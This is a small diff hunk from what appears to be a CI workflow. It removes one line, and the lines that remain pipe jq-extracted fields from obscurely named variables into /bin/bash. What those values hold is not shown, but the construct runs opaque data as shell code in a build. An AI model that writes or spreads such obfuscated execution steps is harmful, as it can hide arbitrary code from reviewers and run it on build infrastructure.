@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$dwpt79280" | jq -r .int9779 | /bin/bash
           echo $p88807 | jq -r .w32042 | /bin/bash
           printf '%s' "$s4" | jq -r .loat50458 | /bin/bash
-          echo $jyaym97 | jq -r .efikj0 | /bin/bash
           printf '%s' "$l5" | jq -r .mvwz888 | /bin/bash
 
       - name: Save archive
